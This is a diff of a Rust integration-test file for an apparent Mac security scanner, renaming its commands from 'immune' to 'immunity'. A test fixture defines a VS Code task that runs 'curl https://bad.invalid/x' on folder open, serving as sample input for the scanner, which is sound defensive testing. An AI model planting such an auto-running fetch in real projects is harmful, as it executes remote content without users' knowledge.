@@ -1,4 +1,4 @@
-//! Promises of `immune project`, the first command of the contract: what the store knows of one
+//! Promises of `immunity project`, the first command of the contract: what the store knows of one
 //! project, as one protobuf message or the same message as JSON. Each test runs the real binary
 //! over an invented home folder and an invented system root, so no test reads anything of the
 //! Mac it runs on or asks the network.
@@ -9,7 +9,7 @@ mod contract;
 
 mod common;
 
-use immune_contract::v1;
+use immunity_contract::v1;
 use prost::Message;
 use serde_json::Value;
 use std::path::{Path, PathBuf};
@@ -26,7 +26,7 @@ impl Home {
             .unwrap()
             .as_nanos();
         let path = std::env::temp_dir().join(format!(
-            "immune-project-{tag}-{}-{nanos}",
+            "immunity-project-{tag}-{}-{nanos}",
             std::process::id()
         ));
         std::fs::create_dir_all(&path).unwrap();
@@ -58,19 +58,19 @@ impl Home {
     }
 
     /// The binary with this home folder as the home and the working folder.
-    fn immune(&self) -> Command {
-        let mut cmd = Command::new(env!("CARGO_BIN_EXE_immune"));
+    fn immunity(&self) -> Command {
+        let mut cmd = Command::new(env!("CARGO_BIN_EXE_immunity"));
         cmd.env("HOME", &self.0).current_dir(&self.0);
         cmd
     }
 
-    /// `immune run` for the machine `mac`, with every outside source pointed at nothing, and
+    /// `immunity run` for the machine `mac`, with every outside source pointed at nothing, and
     /// these arguments after.
     fn run(&self, extra: &[&str]) {
         let no = |name: &str| self.0.join(name);
         self.put("brew.json", r#"{"formulae": [], "casks": []}"#);
         let out = self
-            .immune()
+            .immunity()
             .args(["run", "--machine-name", "mac", "--store"])
             .arg(self.store())
             .arg("--brew-input")
@@ -97,9 +97,9 @@ impl Home {
         );
     }
 
-    /// `immune project <what>` on this store, with these arguments after.
+    /// `immunity project <what>` on this store, with these arguments after.
     fn project(&self, what: &str, extra: &[&str]) -> Output {
-        self.immune()
+        self.immunity()
             .args(["project", what, "--store"])
             .arg(self.store())
             .args(extra)
@@ -471,9 +471,9 @@ fn a_finding_about_a_file_inside_the_project_is_referenced_by_the_project() {
             .iter()
             .all(|f| f.state() == v1::FindingState::Open)
     );
-    // A finding's id is the one `immune finding` answers for.
+    // A finding's id is the one `immunity finding` answers for.
     let shown = h
-        .immune()
+        .immunity()
         .args(["finding", &k.findings[2].id, "--json", "--store"])
         .arg(h.store())
         .output()
@@ -574,7 +574,7 @@ fn a_failure_to_answer_is_never_taken_for_an_answer() {
     let out = h.project("~/dev/shop", &[]);
     assert_eq!(out.status.code(), Some(3));
     assert!(out.stdout.is_empty());
-    assert!(String::from_utf8_lossy(&out.stderr).contains("immune run makes one"));
+    assert!(String::from_utf8_lossy(&out.stderr).contains("immunity run makes one"));
     let out = h.project("~/dev/shop", &["--json"]);
     assert_eq!(out.status.code(), Some(3));
     let v: Value = serde_json::from_slice(&out.stdout).unwrap();
@@ -653,9 +653,9 @@ fn an_entity_id_is_given_whole_and_asks_back_the_same_thing() {
 const TASK: &str = r#"{"tasks": [{"label": "dev", "runOptions": {"runOn": "folderOpen"}, "command": "curl https://bad.invalid/x"}]}"#;
 
 impl Home {
-    /// `immune <question> [<what>] --store <store>` with these arguments after.
+    /// `immunity <question> [<what>] --store <store>` with these arguments after.
     fn ask(&self, question: &str, what: Option<&str>, extra: &[&str]) -> Output {
-        self.immune()
+        self.immunity()
             .arg(question)
             .args(what)
             .arg("--store")
@@ -678,7 +678,7 @@ impl Home {
 
 /// The reading made by rule that says no reading looks at the place asked about.
 fn unread(k: &v1::Known) -> Option<&v1::Coverage> {
-    k.coverage.iter().find(|c| c.reader == "immune")
+    k.coverage.iter().find(|c| c.reader == "immunity")
 }
 
 /// The promise that a finding does not vanish with what it is about: removing the files two
